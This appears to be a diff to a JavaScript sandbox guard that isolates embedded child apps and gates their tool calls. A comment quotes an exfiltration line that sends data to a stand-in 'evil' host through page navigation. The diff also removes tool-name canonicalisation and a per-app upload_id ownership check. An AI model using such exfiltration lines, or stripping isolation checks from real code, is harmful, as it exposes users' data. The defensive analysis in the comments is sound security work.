@@ -24,7 +24,7 @@
 // and exported through index.mjs for embedding shells (the hosted /library preview) so no
 // out-of-repo mirror has to exist.
 
-import { isControlPlaneTool, canonicalToolName, DATA_WRITE_TOOLS as DATA_WRITE_LIST, DATA_BATCH_REFUSAL } from "./tool-policy.mjs";
+import { isControlPlaneTool, DATA_WRITE_TOOLS as DATA_WRITE_LIST, DATA_BATCH_REFUSAL } from "./tool-policy.mjs";
 import { viaOf, sansRequestState, withConfirmation, ackOf } from "./runtime-core.mjs";
 
 // CSP goes FIRST in the child head: no network REQUESTS (connect-src 'none', no remote
@@ -41,7 +41,7 @@ import { viaOf, sansRequestState, withConfirmation, ackOf } from "./runtime-core
 // ITSELF, and `sandbox="allow-scripts"` withholds top/ancestor navigation, not self-navigation:
 // `location.href = "https://evil/?d=" + data` still leaves. Measured 2026-07-31 in Chrome 150
 // against this exact CSP — fetch blocked, img blocked, the navigation carried the payload.
-// Repro: `node test/rig-sandbox-exfil.mjs`. The authoritative account is the self-navigation
+// Repro: `node probes/rig-sandbox-exfil.mjs`. The authoritative account is the self-navigation
 // section of docs/security-model.md, which had this right all along while these lines did not.
 //
 // Worth reading the paragraph below with that in mind: it reasons correctly that `form-action`
@@ -539,12 +539,7 @@ export function composeChildDoc(html, { tokenCss = "", baseCss = "", fallbackCss
 // app binding.
 const DATA_WRITE_TOOLS = new Set(DATA_WRITE_LIST);
 const FILE_READ_TOOLS = new Set(["file_read", "file_list"]);
-const FILE_WRITE_TOOLS = new Set(["file_write", "file_write_begin", "file_write_chunk", "file_write_commit", "file_delete"]);
-const FILE_BIND_TOOLS = new Set(["file_write", "file_write_begin", "file_delete"]);   // carry `app` — forced to the caller
-// The chunked family carries NO app, only an upload_id, so there is nothing to force:
-// binding has to be by WHICH ids this guard opened (see myUploads in makeGuard). They were
-// previously assumed to "inherit begin's binding", which is not a thing the wire supports.
-const UPLOAD_ID_TOOLS = new Set(["file_write_chunk", "file_write_commit"]);
+const FILE_WRITE_TOOLS = new Set(["file_write", "file_delete"]);   // both carry `app` — forced to the caller
 
 // ---- reserved boundaries (W4, redesign §8 R2/R4 — recorded, deliberately NOT built) --------
 //
@@ -589,10 +584,6 @@ export function makeGuard(cfg) {
   const uuid = io.uuid || (() => (globalThis.crypto?.randomUUID ? crypto.randomUUID() : String(Date.now()) + Math.random()));
   const snap = () => io.snapshot() || { collection: coll, items: [], version: 0 };
   const notify = (m) => { try { io.notify && io.notify(m); } catch {} };
-
-  // Chunked-upload ids THIS guard opened. Per-guard (so per mounted child), which is the whole
-  // point: an id another app holds is not in this set and cannot be appended to.
-  const myUploads = new Set();
 
   // The other half of the control-plane instrument (the server half is in engine.mjs). A refusal
   // here never reaches a server — this guard runs in the embedder's document — so the only place
@@ -685,13 +676,10 @@ export function makeGuard(cfg) {
 
   // ---- generic callTool path: control-plane wall → allowlist → per-tool gates ----
   async function guardCallTool(a) {
-    // CANONICALISE BEFORE DECIDING. Every gate below matches on a name, and seven seats still
-    // answer to a retired spelling (tool-policy.mjs TOOL_ALIASES) so apps saved before the rename
-    // keep working. A child reaching for the old name must meet the same wall as one reaching for
-    // the new: a rename that let a check be side-stepped would be the rename opening a hole.
-    // The forwarded call carries the canonical name too — the server answers both, and a log that
-    // says which spelling the child happened to type answers nothing anyone asks.
-    const tn = canonicalToolName(a.name);
+    // Trimmed before deciding: every gate below matches on a name, and the name forwarded is the
+    // one the gates judged. (A retired-spelling canonicalisation sat here until 0.8.1 removed the
+    // alias bridge — a retired spelling is now an unknown tool on the server.)
+    const tn = String(a.name == null ? "" : a.name).trim();
     const ta = Object.assign({}, a.args || {});
     const tl = tn.toLowerCase();
     // Control-plane tools and internal `_` RPC names are NEVER forwarded from a child —
@@ -705,8 +693,7 @@ export function makeGuard(cfg) {
     }
     if (FILE_WRITE_TOOLS.has(tn)) {
       if (caps.file_write !== true) throw new Error("file write denied by policy");
-      if (FILE_BIND_TOOLS.has(tn)) ta.app = name;
-      else if (UPLOAD_ID_TOOLS.has(tn) && !myUploads.has(String(ta.upload_id == null ? "" : ta.upload_id))) throw new Error("upload_id was not opened by this app");
+      ta.app = name;
       // A file delete is a widget's destructive act like any other: it is stamped human so the
       // engine's gate can see who is asking, and it goes through the same confirm-and-resend
       // door. (The file plane carries no `via`, so the per-app preference override does not
@@ -738,10 +725,6 @@ export function makeGuard(cfg) {
     if (DATA_WRITE_TOOLS.has(tn)) return dataWrite(tn, ta, { bound: false });
     const r = await io.callTool(tn, ta);
     if (tn === "data_list") remember(r && r.structuredContent);
-    // Upload-id bookkeeping rides the RESULT, because the id is minted server-side. A commit
-    // consumes the upload either way (files.mjs contract), so the id is retired with it.
-    if (tn === "file_write_begin") { const id = r && r.structuredContent && r.structuredContent.upload_id; if (id) myUploads.add(String(id)); }
-    else if (tn === "file_write_commit") myUploads.delete(String(ta.upload_id == null ? "" : ta.upload_id));
     return r;
   }
 
